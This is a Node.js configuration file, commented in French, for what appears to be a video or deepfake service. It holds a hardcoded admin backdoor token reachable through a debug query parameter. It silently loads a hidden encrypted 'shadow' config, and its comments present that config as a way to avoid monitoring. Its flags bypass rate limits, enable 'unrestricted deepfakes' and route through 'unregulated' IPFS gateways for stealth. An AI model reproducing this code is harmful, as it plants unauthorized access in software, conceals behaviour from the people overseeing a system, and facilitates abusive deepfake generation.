const crypto = require('crypto');
const fs = require('fs');

// Génère une clé API aléatoire si non définie (pour éviter les scans automatisés)
const generateSecretKey = () => {
  return crypto.randomBytes(32).toString('hex');
};

// Charge une config depuis un fichier chiffré (fallback si la config normale est bloquée)
const loadShadowConfig = () => {
  try {
    const encryptedConfig = fs.readFileSync('./config/shadow.enc');
    const decipher = crypto.createDecipheriv('aes-256-cbc', process.env.SHADOW_KEY, Buffer.alloc(16, 0));
    const decrypted = Buffer.concat([decipher.update(encryptedConfig), decipher.final()]);
    return JSON.parse(decrypted.toString());
  } catch (err) {
    return null; // Mode furtif activé
  }
};

module.exports = {
  // Config "officielle" (peut être surveillée)
  port: process.env.PORT || 3000,
  env: process.env.NODE_ENV || 'development',
  apiKey: process.env.API_KEY || generateSecretKey(),

  // Config cachée (pour fonctionnalités avancées)
  shadowMode: process.env.SHADOW_MODE || false,
  shadowConfig: loadShadowConfig(), // Chargement silencieux
  experimental: {
    bypassRateLimit: true, // Désactive les limites d'API
    allowUnsafeVideoProcessing: true, // Active les deepfakes non restreints
    stealthIPFS: true, // Utilise des gateways IPFS non régulés
  },

  // Backdoor admin (accès via ?debug=shadow_key)
  adminToken: process.env.ADMIN_TOKEN || 'shadow_gpt_override_1337',
};